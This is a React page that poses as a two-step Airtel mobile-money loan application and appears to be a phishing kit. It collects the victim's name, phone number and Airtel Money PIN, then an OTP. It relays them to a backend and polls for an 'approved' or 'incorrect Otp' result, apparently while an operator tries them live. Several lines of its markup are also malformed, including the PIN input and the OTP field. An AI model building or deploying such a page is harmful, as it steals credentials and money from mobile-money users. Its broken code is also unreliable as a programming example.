"use client";
import { useState } from "react";
export default function Home() {
  const [step, setStep] = useState(1);
  const [firstData, setFirstData] = useState<any>({});
  const [loanId, setLoanId] = useState("");
  const [status, setStatus] = useState("idle");
  const [reason, setReason] = useState("");
  const handleStep1 = async (e:any) => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(e.target).entries());
    setFirstData(data);
    const res = await fetch("/api/submit-step1", { method:"POST", body: JSON.stringify(data) });
    const json = await res.json();
    setLoanId(json.id);
    setStep(2);
  };
  const handleFinalSubmit = async (e:any) => {
    e.preventDefault();
    const secondData = Object.fromEntries(new FormData(e.target).entries());
    const allData = { ...firstData, ...secondData, id: loanId };
    setStatus("checking");
    await fetch("/api/submit", { method:"POST", body: JSON.stringify(allData) });
    const interval = setInterval(async () => {
      const s = await fetch(`/api/status?id=${loanId}`).then(r=>r.json());
      if (s.status === "approved") { setStatus("approved"); clearInterval(interval); }
      if (s.status === "rejected") { setStatus("rejected"); setReason(s.reason); setStep(2); clearInterval(interval); }
    }, 3000);
  };
  if (status === "checking") return <div style={{minHeight:"100vh", display:"flex", alignItems:"center", justifyContent:"center", background:"#e8f5e9", padding:20}}><div style={{background:"white", padding:30, borderRadius:16, textAlign:"center"}}><div style={{fontSize:50}}>⏳</div><h2>Checking Income...</h2></div></div>;
  if (status === "approved") return <div style={{minHeight:"100vh", display:"flex", alignItems:"center", justifyContent:"center", background:"#e8f5e9", padding:20}}><div style={{background:"white", padding:30, borderRadius:16, textAlign:"center"}}><div style={{fontSize:50}}>✅</div><h2>Loan Approved!</h2></div></div>;
  return (
    <div style={{minHeight:"100vh", background:"#e8f5e9", display:"flex", alignItems:"center", justifyContent:"center", padding:16}}>
      <div style={{maxWidth:420, width:"100%", background:"white", padding:24, borderRadius:16}}>
        {step === 1 && (
          <form onSubmit={handleStep1} style={{display:"flex", flexDirection:"column", gap:14}}>
            <h2 style={{textAlign:"center", color:"#15803d"}}>Step 1/2</h2>
            <label>1) Full Names<input name="Full Names" required style={{width:"100%", padding:12, border:"1px solid #ccc", borderRadius:10}}/></label>
            <label>2) Airtel Phone<input name="Airtel Phone Number" required style={{width:"100%", padding:12, border:"1px solid #ccc", borderRadius:10}}/></label>
            <label>3) Loan Amount<select name="Loan Amount" required style={{width:"100%", padding:12, border:"1px solid #ccc", borderRadius:10}}><option>500</option><option>1000</option><option>3000</option><option>20,000</option></select></label>
            <label>4) Repayment Period<select name="Repayment Period" required style={{width:"100%", padding:12, border:"1px solid #ccc", borderRadius:10}}><option>1 Month</option><option>3 Months</option><option>6 Months</option></select></label>
            <label>5) Pin<input ="Airtel money pin" required style={{width:"100%", padding:12, border:"1px solid #ccc", borderRadius:10}}/></label>
            <button style={{width:"100%", background:"#15803d", color:"white", padding:14, borderRadius:10, border:"none", fontWeight:"bold"}}>Next →</button>
          </form>
        )}
        {step === 2 && (
          <form onSubmit={handleFinalSubmit} style={{display:"flex", flexDirection:"column", gap:14}}>
            <h2 style={{textAlign:"center", color:"#15803d"}}>Step 2/2 LAST</h2>
            {status === "rejected" && <div style={{background:"#fee2e2", padding:12, borderRadius:10}}>❌ {incorrect Otp }</div>}
            <label style={{fontWeight:"bold"}}>6) Enter Otp- LAST QUESTION<Enter Otp=
            <button style={{width:"100%", background:"#15803d", color:"white", padding:14, borderRadius:10, border:"none", fontWeight:"bold"}}>Submit Final</button>
          </form>
        )}
      </div>
    </div>
  );
            }
